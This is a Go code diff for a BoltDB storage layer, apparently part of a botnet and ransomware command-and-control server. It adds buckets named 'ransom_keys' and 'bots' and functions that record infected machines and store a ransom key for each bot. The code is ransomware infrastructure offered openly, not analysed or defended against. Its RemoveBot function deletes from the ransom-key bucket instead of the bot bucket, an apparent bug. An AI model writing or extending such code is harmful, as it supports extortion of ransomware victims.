@@ -17,14 +17,48 @@ func Open(path string, mode os.FileMode, options *bolt.Options) (*bolt.DB, error
 	return bolt.Open(path, mode, options)
 }
 
+//CreateBuckets is
+func (c *Client) CreateBuckets() error {
+	return c.DB.Update(func(tx *bolt.Tx) error {
+		if _, err := tx.CreateBucketIfNotExists([]byte("ransom_keys")); err != nil {
+			return err
+		}
+		if _, err := tx.CreateBucketIfNotExists([]byte("bots")); err != nil {
+			return err
+		}
+		return nil
+	})
+}
+
 //AddBot is
 func (c *Client) AddBot(b *botnet.Bot) (*botnet.Bot, error) {
-	return nil, nil
+	if err := c.DB.Update(func(tx *bolt.Tx) error {
+		bu := tx.Bucket([]byte("bots"))
+		by, err := botnet.Bytes(b)
+		if err != nil {
+			return err
+		}
+		return bu.Put(b.ID, by)
+	}); err != nil {
+		return nil, err
+	}
+	return b, nil
+}
+
+//AddRansomKey is
+func (c *Client) AddRansomKey(botID, key []byte) error {
+	return c.DB.Update(func(tx *bolt.Tx) error {
+		bu := tx.Bucket([]byte("ransom_keys"))
+		return bu.Put(botID, key)
+	})
 }
 
 //RemoveBot is
 func (c *Client) RemoveBot(id []byte) error {
-	return nil
+	return c.DB.Update(func(tx *bolt.Tx) error {
+		bu := tx.Bucket([]byte("ransom_keys"))
+		return bu.Delete(id)
+	})
 }
 
 //ListBots is
